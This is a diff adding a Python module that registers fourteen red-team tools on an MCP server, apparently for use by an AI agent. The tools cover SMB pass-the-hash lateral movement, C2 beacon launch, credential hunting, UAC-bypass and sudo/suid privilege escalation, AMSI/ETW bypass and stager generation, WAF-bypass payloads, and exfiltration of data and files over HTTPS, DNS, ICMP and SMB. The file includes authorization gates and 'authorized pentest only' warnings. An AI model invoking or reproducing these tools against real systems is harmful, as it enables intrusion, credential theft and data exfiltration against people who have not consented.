@@ -1,0 +1,622 @@
+"""
+红队工具处理器
+包含: lateral_smb, c2_beacon_start, payload_obfuscate, credential_find,
+      privilege_check, privilege_escalate, exfiltrate_data, exfiltrate_file
+
+授权级别:
+- CRITICAL: lateral_smb, c2_beacon_start, credential_find, privilege_escalate,
+            exfiltrate_*, post_exploit_amsi/etw/stager/evasion_chain
+- DANGEROUS: payload_obfuscate, waf_bypass, privilege_check, post_exploit_privesc_suggest
+"""
+
+from typing import Any, Dict, List, Optional
+
+# 授权中间件
+from core.security import require_critical_auth, require_dangerous_auth
+
+from .error_handling import (
+    ErrorCategory,
+    extract_file_path,
+    extract_target,
+    handle_errors,
+    require_non_empty,
+    validate_inputs,
+)
+from .runtime_helpers import (
+    blocked_handler_runtime_response,
+    complete_handler_runtime_payload,
+    evidence_items,
+    gate_handler_runtime_action,
+)
+from .tooling import no_target_contact, tool
+
+
+def _gate_redteam_runtime(
+    tool_name: str,
+    inputs: Dict[str, Any],
+    risk_level: str = "critical",
+    network_policy: str = "controlled",
+) -> Dict[str, Any]:
+    return gate_handler_runtime_action(
+        tool_name,
+        inputs=inputs,
+        risk_level=risk_level,
+        source="redteam_handler",
+        requires_auth=True,
+        human_approved=True,
+        network_policy=network_policy,
+        artifact_policy="metadata-only",
+        cleanup_policy="handler-owned",
+    )
+
+
+def register_redteam_tools(mcp, counter, logger):
+    """注册红队相关工具
+
+    Args:
+        mcp: FastMCP实例
+        counter: ToolCounter实例
+        logger: Logger实例
+    """
+
+    @tool(mcp)
+    @require_critical_auth
+    @validate_inputs(target="target")
+    @handle_errors(logger, ErrorCategory.REDTEAM, extract_target)
+    async def lateral_smb(
+        target: str,
+        username: str,
+        password: Optional[str] = None,
+        ntlm_hash: Optional[str] = None,
+        command: str = "whoami",
+    ) -> Dict[str, Any]:
+        """SMB横向移动 - 通过SMB执行远程命令
+
+        支持: 密码认证、Pass-the-Hash
+        警告: 仅限授权渗透测试使用！
+
+        Args:
+            target: 目标IP
+            username: 用户名
+            password: 密码 (与ntlm_hash二选一)
+            ntlm_hash: NTLM Hash (格式: LM:NT)
+            command: 要执行的命令
+
+        Returns:
+            执行结果
+        """
+        from core.lateral.smb import smb_exec
+
+        gate = _gate_redteam_runtime(
+            "lateral_smb",
+            {"target": target, "username": username, "command": command},
+        )
+        if not gate["allowed"]:
+            return blocked_handler_runtime_response(gate)
+
+        result = smb_exec(
+            target=target,
+            username=username,
+            password=password or "",
+            ntlm_hash=ntlm_hash or "",
+            command=command,
+        )
+        result["evidence"] = evidence_items(
+            "lateral_smb",
+            "command",
+            f"SMB 执行 {command} {'成功' if result.get('success') else '失败'}",
+        )
+        result["verified"] = bool(result.get("success"))
+        return complete_handler_runtime_payload(
+            gate,
+            result,
+            summary_keys=("success", "target", "command"),
+        )
+
+    @tool(mcp)
+    @require_critical_auth
+    @validate_inputs(server="target", port="port")
+    @handle_errors(
+        logger,
+        ErrorCategory.REDTEAM,
+        lambda a, kw: {"server": kw.get("server") or (a[0] if a else None)},
+    )
+    async def c2_beacon_start(
+        server: str, port: int = 443, protocol: str = "https", interval: float = 60.0
+    ) -> Dict[str, Any]:
+        """启动C2 Beacon - 创建到C2服务器的Beacon连接
+
+        警告: 仅限授权渗透测试使用！
+
+        Args:
+            server: C2服务器地址
+            port: 端口
+            protocol: 协议 (http, https)
+            interval: 心跳间隔(秒)
+
+        Returns:
+            Beacon状态
+        """
+        from core.c2.beacon import create_beacon
+
+        gate = _gate_redteam_runtime(
+            "c2_beacon_start",
+            {"server": server, "port": port, "protocol": protocol, "interval": interval},
+        )
+        if not gate["allowed"]:
+            return blocked_handler_runtime_response(gate)
+
+        beacon = create_beacon(server=server, port=port, protocol=protocol, interval=interval)
+
+        if beacon.connect():
+            beacon.start()
+            return complete_handler_runtime_payload(
+                gate,
+                {
+                    "success": True,
+                    "beacon_id": beacon.beacon_id,
+                    "status": beacon.status.value,
+                    "server": server,
+                    "evidence": evidence_items(
+                        "c2_beacon_start", "command", f"C2 Beacon 连接 {server} 成功"
+                    ),
+                    "verified": True,
+                },
+                summary_keys=("server", "status"),
+            )
+
+        return complete_handler_runtime_payload(
+            gate,
+            {
+                "success": False,
+                "error": "Connection failed",
+                "server": server,
+                "evidence": evidence_items(
+                    "c2_beacon_start", "command", f"C2 Beacon 连接 {server} 失败"
+                ),
+                "verified": False,
+            },
+            summary_keys=("server",),
+        )
+
+    @tool(mcp)
+    @require_dangerous_auth
+    @require_non_empty("payload")
+    @handle_errors(logger, ErrorCategory.REDTEAM)
+    @no_target_contact("对给定字符串做混淆变体，不接触目标")
+    async def payload_obfuscate(payload: str, technique: str = "xor") -> Dict[str, Any]:
+        """Payload混淆 - 对payload进行混淆处理
+
+        支持技术: xor, base64, aes, custom
+        警告: 仅限授权渗透测试使用！
+
+        Args:
+            payload: 原始payload
+            technique: 混淆技术
+
+        Returns:
+            混淆后的payload
+        """
+        from core.evasion.payload_obfuscator import obfuscate_payload
+
+        result = obfuscate_payload(payload, technique=technique)
+
+        return {
+            "success": True,
+            "original_length": len(payload),
+            "obfuscated_length": len(result),
+            "technique": technique,
+            "obfuscated": result,
+        }
+
+    @tool(mcp)
+    @require_dangerous_auth
+    @require_non_empty("payload")
+    @handle_errors(logger, ErrorCategory.REDTEAM)
+    @no_target_contact("生成绕过变体与方案，不去验证目标是否真的放行")
+    async def waf_bypass(
+        payload: str,
+        waf_name: Optional[str] = None,
+        max_variants: int = 30,
+        include_headers: bool = False,
+        include_paths: bool = False,
+        path: str = "/",
+    ) -> Dict[str, Any]:
+        """WAF绕过Payload生成 - 生成变异Payload与绕过方案
+
+        Args:
+            payload: 原始payload
+            waf_name: WAF名称 (可选)
+            max_variants: 最大变体数量
+            include_headers: 是否返回头部绕过方案
+            include_paths: 是否返回路径绕过变体
+            path: 目标路径
+
+        Returns:
+            WAF绕过结果
+        """
+        from core.evasion.waf_bypass_engine import WAFBypassEngine, normalize_waf_type
+
+        engine = WAFBypassEngine()
+        waf_type = normalize_waf_type(waf_name)
+        variants = engine.generate_bypass(payload, waf_type, max_variants=max_variants)
+
+        data = {
+            "success": True,
+            "waf_type": waf_type.value,
+            "payload": payload,
+            "variants": [
+                {
+                    "payload": v.bypassed_payload,
+                    "technique": v.technique.value,
+                    "confidence": v.confidence,
+                }
+                for v in variants
+            ],
+            "count": len(variants),
+        }
+
+        if include_headers:
+            data["header_bypass"] = engine.generate_header_bypass(path=path)
+        if include_paths:
+            data["path_bypass"] = engine.generate_path_bypass(path=path)
+
+        return data
+
+    @tool(mcp)
+    @require_critical_auth
+    @validate_inputs(path="path")
+    @handle_errors(
+        logger,
+        ErrorCategory.REDTEAM,
+        lambda a, kw: {"path": kw.get("path") or (a[0] if a else None)},
+    )
+    async def credential_find(path: str = ".") -> Dict[str, Any]:
+        """凭证发现 - 在文件中搜索敏感凭证
+
+        搜索: API密钥、密码、令牌、私钥等
+        警告: 仅限授权渗透测试使用！
+
+        Args:
+            path: 搜索路径 (默认当前目录)
+
+        Returns:
+            发现的凭证
+        """
+        from core.credential.password_finder import find_secrets
+
+        results = find_secrets(path=path)
+
+        total = results["summary"]["total_findings"]
+        payload = {
+            "success": True,
+            "path": path,
+            "findings": results["findings"],
+            "total": total,
+        }
+        payload["evidence"] = evidence_items(
+            "credential_find", "enumeration", f"发现 {total} 处敏感凭证"
+        )
+        payload["verified"] = total > 0
+        return payload
+
+    # ==================== 权限提升工具 ====================
+
+    @tool(mcp)
+    @require_dangerous_auth
+    @handle_errors(logger, ErrorCategory.REDTEAM)
+    async def privilege_check() -> Dict[str, Any]:
+        """检查当前权限级别 - 获取当前系统权限和可用提权向量
+
+        警告: 仅限授权渗透测试使用！
+
+        Returns:
+            当前权限级别和可用提权向量列表
+        """
+        from core.privilege_escalation import get_escalation_module
+
+        module = get_escalation_module()
+        level = module.check_current_privilege()
+        vectors = module.enumerate_vectors()
+
+        payload = {
+            "success": True,
+            "current_level": level.value,
+            "vectors": vectors,
+            "platform": module.platform,
+            "vectors_count": len(vectors),
+        }
+        payload["evidence"] = evidence_items(
+            "privilege_check",
+            "enumeration",
+            f"枚举出 {len(vectors)} 个提权向量，当前权限 {level.value}",
+        )
+        payload["verified"] = len(vectors) > 0
+        return payload
+
+    @tool(mcp)
+    @require_critical_auth
+    @handle_errors(
+        logger, ErrorCategory.REDTEAM, lambda a, kw: {"method": kw.get("method", "auto")}
+    )
+    async def privilege_escalate(method: str = "auto", timeout: float = 60.0) -> Dict[str, Any]:
+        """执行权限提升 - 尝试提升系统权限
+
+        支持方法:
+        - Windows: uac_bypass (fodhelper/eventvwr/sdclt), token_impersonation
+        - Linux: suid, sudo, capability
+
+        警告: 仅限授权渗透测试使用！
+
+        Args:
+            method: 提权方法 (auto, uac_bypass, token_impersonation, suid, sudo)
+            timeout: 超时时间(秒)
+
+        Returns:
+            提权结果
+        """
+        from core.privilege_escalation import (
+            EscalationConfig,
+            EscalationMethod,
+            get_escalation_module,
+        )
+
+        config = EscalationConfig(timeout=timeout)
+        module = get_escalation_module(config)
+
+        if method == "auto":
+            result = module.auto_escalate()
+        else:
+            result = module.escalate(EscalationMethod(method))
+
+        return {
+            "success": result.success,
+            "method": result.method.value,
+            "from_level": result.from_level.value,
+            "to_level": result.to_level.value,
+            "output": result.output,
+            "error": result.error,
+            "duration": result.duration,
+            "evidence": result.evidence,
+        }
+
+    # ==================== 后渗透工具 ====================
+
+    @tool(mcp)
+    @require_critical_auth
+    @handle_errors(logger, ErrorCategory.REDTEAM)
+    @no_target_contact("生成 AMSI 绕过代码，不接触目标")
+    async def post_exploit_amsi_bypass(technique: Optional[str] = None) -> Dict[str, Any]:
+        """AMSI绕过 - 生成AMSI绕过代码
+
+        Args:
+            technique: 绕过技术 (可选)
+
+        Returns:
+            AMSI绕过代码
+        """
+        from core.post_exploit import get_amsi_bypass
+
+        return {
+            "success": True,
+            "technique": technique or "auto",
+            "code": get_amsi_bypass(technique),
+        }
+
+    @tool(mcp)
+    @require_critical_auth
+    @handle_errors(logger, ErrorCategory.REDTEAM)
+    @no_target_contact("返回内置 ETW Patch 代码常量，不接触目标")
+    async def post_exploit_etw_bypass() -> Dict[str, Any]:
+        """ETW绕过 - 获取ETW Patch代码"""
+        from core.post_exploit.advanced_techniques import ETWBypass
+
+        return {"success": True, "code": ETWBypass.PS_ETW_BYPASS}
+
+    @tool(mcp)
+    @require_critical_auth
+    @handle_errors(logger, ErrorCategory.REDTEAM)
+    @no_target_contact("生成 stager 代码，不接触目标")
+    async def post_exploit_stager(
+        payload_type: str = "powershell",
+        include_amsi_bypass: bool = True,
+        include_etw_bypass: bool = True,
+    ) -> Dict[str, Any]:
+        """生成后渗透stager代码
+
+        Args:
+            payload_type: stager 类型 (powershell 等)
+            include_amsi_bypass: 是否内联 AMSI 绕过
+            include_etw_bypass: 是否内联 ETW 绕过
+        """
+        from core.post_exploit import PostExploitManager
+
+        manager = PostExploitManager()
+        stager = manager.generate_stager(
+            payload_type=payload_type,
+            include_amsi_bypass=include_amsi_bypass,
+            include_etw_bypass=include_etw_bypass,
+        )
+
+        return {"success": True, "payload_type": payload_type, "stager": stager}
+
+    @tool(mcp)
+    @require_critical_auth
+    @handle_errors(logger, ErrorCategory.REDTEAM)
+    @no_target_contact("按目标 OS 返回推荐的规避链，不接触目标")
+    async def post_exploit_evasion_chain(target_os: str = "windows") -> Dict[str, Any]:
+        """获取推荐的后渗透规避链
+
+        Args:
+            target_os: 目标操作系统 (windows, linux)
+        """
+        from core.post_exploit import PostExploitManager
+
+        manager = PostExploitManager()
+        chain = manager.get_evasion_chain(target_os=target_os)
+
+        return {"success": True, "target_os": target_os, "chain": chain}
+
+    @tool(mcp)
+    @require_dangerous_auth
+    @require_non_empty("current_privileges")
+    @handle_errors(logger, ErrorCategory.REDTEAM)
+    @no_target_contact("根据传入的权限列表给出提权建议，不接触目标")
+    async def post_exploit_privesc_suggest(
+        current_privileges: List[str], target_os: str = "windows"
+    ) -> Dict[str, Any]:
+        """根据当前权限建议提权路径
+
+        Args:
+            current_privileges: 已获取的权限/身份列表
+            target_os: 目标操作系统 (windows, linux)
+        """
+        from core.post_exploit import PostExploitManager
+
+        manager = PostExploitManager()
+        suggestions = manager.suggest_privesc(
+            current_privileges=current_privileges, target_os=target_os
+        )
+
+        return {"success": True, "target_os": target_os, "suggestions": suggestions}
+
+    # ==================== 数据外泄工具 ====================
+
+    @tool(mcp)
+    @require_critical_auth
+    @require_non_empty("data")
+    @handle_errors(
+        logger, ErrorCategory.REDTEAM, lambda a, kw: {"channel": kw.get("channel", "https")}
+    )
+    async def exfiltrate_data(
+        data: str,
+        channel: str = "https",
+        destination: str = "",
+        encryption: bool = True,
+        dns_domain: str = "",
+        nameserver: str = "",
+    ) -> Dict[str, Any]:
+        """数据外泄 - 通过加密通道外泄数据
+
+        支持通道:
+        - https: HTTPS POST请求
+        - dns: DNS子域名编码
+        - icmp: ICMP Echo请求 (需要root)
+        - smb: SMB文件共享
+
+        警告: 仅限授权渗透测试使用！
+
+        Args:
+            data: 要外泄的数据 (Base64编码)
+            channel: 外泄通道
+            destination: 目标地址 (HTTP/SMB 为目标地址，DNS 为域名)
+            encryption: 是否加密
+            dns_domain: DNS 外泄域名 (destination 为 nameserver 时需显式设置)
+            nameserver: DNS nameserver IP (可选)
+
+        Returns:
+            外泄结果
+        """
+        import base64
+
+        from core.exfiltration import ExfilChannel, ExfilConfig, ExfilFactory
+
+        gate = _gate_redteam_runtime(
+            "exfiltrate_data",
+            {"channel": channel, "destination": destination, "bytes": len(data)},
+        )
+        if not gate["allowed"]:
+            return blocked_handler_runtime_response(gate)
+
+        config = ExfilConfig(
+            channel=ExfilChannel(channel),
+            destination=destination,
+            encryption=encryption,
+            dns_domain=dns_domain,
+            nameserver=nameserver or None,
+        )
+
+        module = ExfilFactory.create(config)
+        raw_data = base64.b64decode(data)
+        result = module.exfiltrate(raw_data)
+
+        exfil_result = result.to_dict()
+        exfil_result["evidence"] = evidence_items(
+            "exfiltrate_data",
+            "command",
+            f"外泄 {exfil_result.get('transferred', 0)} 字节（{channel}）",
+        )
+        exfil_result["verified"] = bool(exfil_result.get("success"))
+        return complete_handler_runtime_payload(
+            gate,
+            exfil_result,
+            summary_keys=("success", "channel", "transferred"),
+        )
+
+    @tool(mcp)
+    @require_critical_auth
+    @validate_inputs(file_path="path")
+    @handle_errors(logger, ErrorCategory.REDTEAM, extract_file_path)
+    async def exfiltrate_file(
+        file_path: str,
+        channel: str = "https",
+        destination: str = "",
+        dns_domain: str = "",
+        nameserver: str = "",
+    ) -> Dict[str, Any]:
+        """文件外泄 - 外泄指定文件
+
+        警告: 仅限授权渗透测试使用！
+
+        Args:
+            file_path: 文件路径
+            channel: 外泄通道 (https, dns, icmp, smb)
+            destination: 目标地址 (HTTP/SMB 为目标地址，DNS 为域名)
+            dns_domain: DNS 外泄域名 (destination 为 nameserver 时需显式设置)
+            nameserver: DNS nameserver IP (可选)
+
+        Returns:
+            外泄结果
+        """
+        from pathlib import Path
+
+        from core.exfiltration import ExfilChannel, ExfilConfig, ExfilFactory
+
+        path = Path(file_path)
+        if not path.exists():
+            return {"success": False, "error": f"文件不存在: {file_path}", "file_path": file_path}
+
+        gate = _gate_redteam_runtime(
+            "exfiltrate_file",
+            {"file_path": file_path, "channel": channel, "destination": destination},
+        )
+        if not gate["allowed"]:
+            return blocked_handler_runtime_response(gate)
+
+        config = ExfilConfig(
+            channel=ExfilChannel(channel),
+            destination=destination,
+            encryption=True,
+            dns_domain=dns_domain,
+            nameserver=nameserver or None,
+        )
+
+        module = ExfilFactory.create(config)
+        data = path.read_bytes()
+        result = module.exfiltrate(data)
+
+        exfil_result = {**result.to_dict(), "file": str(path), "file_size": len(data)}
+        exfil_result["evidence"] = evidence_items(
+            "exfiltrate_file",
+            "command",
+            f"外泄文件 {len(data)} 字节（{channel}）",
+        )
+        exfil_result["verified"] = bool(exfil_result.get("success"))
+        return complete_handler_runtime_payload(
+            gate,
+            exfil_result,
+            summary_keys=("success", "channel", "file_size"),
+        )
+
+    counter.add("redteam", 14)
+    logger.info("[RedTeam] 已注册 14 个红队工具 (含WAF绕过与后渗透)")
